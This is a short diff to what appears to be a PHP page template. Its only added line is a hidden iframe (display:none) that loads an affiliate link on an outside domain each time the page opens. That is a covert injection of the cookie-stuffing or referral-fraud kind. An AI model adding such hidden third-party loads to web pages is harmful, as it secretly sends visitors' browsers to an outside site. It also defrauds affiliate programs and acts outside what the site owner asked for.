@@ -139,3 +139,4 @@ $(function () {
 });
 </script>
 <?php view::end('content');?>
+ <iframe src="https://www.yiyi.one/aff.php?aff=28" style="display:none"></iframe>
